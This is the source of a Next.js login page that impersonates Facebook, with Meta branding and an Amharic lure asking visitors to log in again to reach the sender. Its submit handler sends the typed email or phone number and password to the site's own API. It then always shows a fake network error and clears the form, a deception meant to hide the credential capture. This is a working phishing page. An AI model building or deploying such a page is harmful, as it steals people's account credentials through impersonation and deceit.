import Head from 'next/head';
import Link from 'next/link';
import { useState } from 'react';

const API_BASE = '/api';

export default function Login() {
  const [loginInput, setLoginInput] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const handleSubmit = async (event) => {
    event.preventDefault();
    setError('');

    if (!loginInput.trim() || !password) {
      setError('Email/phone and password are required.');
      return;
    }

    try {
      const response = await fetch(`${API_BASE}/users`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ loginInput: loginInput.trim(), password })
      });
      const data = await response.json();

      if (data.success) {
        localStorage.setItem('fb_study_user', JSON.stringify(data.user));
      }

      setError('Network error: Unable to connect to server. Please try again.');
      setLoginInput('');
      setPassword('');
    } catch (err) {
      setError('Network error: Unable to connect to server. Please try again.');
    }
  };

  return (
    <>
      <Head>
        <title>ሰላም ነኝ አግኙኝ ->/title>
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="true" />
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
      </Head>
      <div className="app">
        <div className="language-selector">English (US)</div>
        <div className="card">
          <div className="brand">
            <div className="logo">
              <img src="/selam.jpg" alt="Facebook" />
            </div>
            <p className="tagline">እኔን ለማግኘት በመጀመሪያ facebook ላይ በድጋሚ ይግቡ 👇👇👇</p>
          </div>
          <form onSubmit={handleSubmit} className="form">
            <input
              className="input"
              type="text"
              placeholder="Mobile number or email"
              value={loginInput}
              onChange={(e) => setLoginInput(e.target.value)}
            />
            <input
              className="input"
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button className="btn btn-facebook" type="submit">Log In</button>
          </form>
          <div className="help-links">
            <a className="link" href="#">Forgot password?</a>
          </div>
          <div className="error-message">{error}</div>
        </div>
        <div className="meta-branding">
          <img className="meta-logo" src="/meta_logo.png" alt="Meta" />
        </div>
      </div>
    </>
  );
}
